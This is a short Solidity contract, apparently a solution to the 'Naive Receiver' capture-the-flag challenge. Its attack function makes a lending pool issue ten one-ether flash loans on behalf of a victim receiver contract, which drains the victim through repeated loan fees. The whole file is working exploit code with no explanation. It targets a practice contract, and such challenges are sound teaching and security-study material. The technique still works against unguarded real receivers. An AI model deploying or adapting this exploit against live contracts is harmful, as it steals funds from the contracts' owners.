// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";


interface INaiveReciverLenderPool{
    function flashLoan(address borrower,uint256 borrowAmout) external;
}

contract NaiveReciverAttacker {
    using Address for address payable;
    
    function attack(INaiveReciverLenderPool _lendPool, address _victim) public {
        for (uint8 i = 0; i < 10;i++){
            _lendPool.flashLoan(_victim, 1 ether);
        }
    }
    
}